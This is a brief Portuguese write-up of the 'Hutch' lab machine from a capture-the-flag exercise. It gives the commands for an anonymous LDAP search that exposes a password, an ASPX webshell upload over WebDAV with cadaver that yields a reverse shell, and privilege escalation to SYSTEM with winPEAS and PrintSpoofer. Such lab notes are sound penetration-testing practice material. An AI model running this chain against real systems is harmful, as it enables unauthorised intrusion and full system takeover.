# Hutch
> DC enum + credenciais LDAP + cadaver WebDAV

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
ldapsearch -x -H ldap://<IP> -b "DC=hutch,DC=offsec" -s sub "(objectClass=user)" | grep -i description
```

Senha encontrada na descrição de um usuário no LDAP.

## Exploração

WebDAV habilitado. Upload de webshell com `cadaver`:

```
cadaver http://<IP>/
# usar credenciais do LDAP
put shell.aspx
```

Acesso via browser → reverse shell como usuário de serviço.

## Escalada de Privilégio

```
.\winPEAS.exe
```

Credenciais de serviço ou token de impersonação disponíveis.

```
.\PrintSpoofer.exe -i -c cmd
```

SYSTEM obtido.
